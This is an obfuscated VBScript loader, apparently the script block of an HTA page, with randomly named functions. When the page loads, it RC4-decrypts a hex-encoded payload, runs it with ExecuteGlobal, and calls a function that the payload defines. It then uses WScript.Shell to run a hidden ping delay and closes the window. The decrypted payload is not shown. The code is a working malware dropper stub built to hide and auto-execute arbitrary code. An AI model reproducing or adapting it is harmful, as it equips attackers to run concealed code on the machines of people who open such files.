Sub kwrxsbsskni(key)
    Dim i, j, t, klen
    klen = UBound(key) + 1
    For i = 0 To 255
        skiamfdsqqe(i) = i
    Next
    j = 0
    For i = 0 To 255
        j = (j + skiamfdsqqe(i) + key(i Mod klen)) Mod 256
        t = skiamfdsqqe(i)
        skiamfdsqqe(i) = skiamfdsqqe(j)
        skiamfdsqqe(j) = t
    Next
End Sub

Function rhxifvmucri(data, key)
    Dim i, j, k, t, n, out()
    kwrxsbsskni key
    n = UBound(data) + 1
    ReDim out(n - 1)
    i = 0
    j = 0
    For k = 0 To n - 1
        i = (i + 1) Mod 256
        j = (j + skiamfdsqqe(i)) Mod 256
        t = skiamfdsqqe(i)
        skiamfdsqqe(i) = skiamfdsqqe(j)
        skiamfdsqqe(j) = t
        out(k) = data(k) Xor skiamfdsqqe((skiamfdsqqe(i) + skiamfdsqqe(j)) Mod 256)
    Next
    rhxifvmucri = out
End Function

Function hutpijwcjyx(h)
    Dim n, i, b()
    n = Len(h) \ 2
    ReDim b(n - 1)
    For i = 0 To n - 1
        b(i) = CInt("&H" & Mid(h, i * 2 + 1, 2))
    Next
    hutpijwcjyx = b
End Function

Function yvmfrgcqnhq(b)
    Dim s, i, n, c, c2, c3, c4, cp
    s = ""
    i = 0
    n = UBound(b) + 1
    Do While i < n
        c = b(i)
        If c < 128 Then
            s = s & ChrW(c)
            i = i + 1
        ElseIf c < 224 And i + 1 < n Then
            c2 = b(i + 1)
            s = s & ChrW(((c And 31) * 64) + (c2 And 63))
            i = i + 2
        ElseIf c < 240 And i + 2 < n Then
            c2 = b(i + 1)
            c3 = b(i + 2)
            s = s & ChrW(((c And 15) * 4096) + ((c2 And 63) * 64) + (c3 And 63))
            i = i + 3
        ElseIf i + 3 < n Then
            c2 = b(i + 1)
            c3 = b(i + 2)
            c4 = b(i + 3)
            cp = ((c And 7) * 262144) + ((c2 And 63) * 4096) + ((c3 And 63) * 64) + (c4 And 63)
            cp = cp - 65536
            s = s & ChrW(55296 + (cp \ 1024)) & ChrW(56320 + (cp Mod 1024))
            i = i + 4
        Else
            i = n
        End If
    Loop
    yvmfrgcqnhq = s
End Function


Sub Window_OnLoad()
    Dim kb, bb, pb, src, otzoivjqrug
    kb = hutpijwcjyx(mcugybbgtzo)
    If Err.Number <> 0 Then
        Exit Sub
    End If
    bb = hutpijwcjyx(nhecizlclca)
    If Err.Number <> 0 Then
        Exit Sub
    End If
    pb = rhxifvmucri(bb, kb)
    If Err.Number <> 0 Then
        Exit Sub
    End If
    src = yvmfrgcqnhq(pb)
    If Err.Number <> 0 Then
        Exit Sub
    End If
    If Len(src) = 0 Then
        Exit Sub
    End If
    ExecuteGlobal src
    If Err.Number <> 0 Then
        Exit Sub
    End If
    zaxmiorncfo
    Set otzoivjqrug = CreateObject("WScript.Shell")
    otzoivjqrug.Run "ping -n 7 127.0.0.1", 0, True
    window.close
End Sub

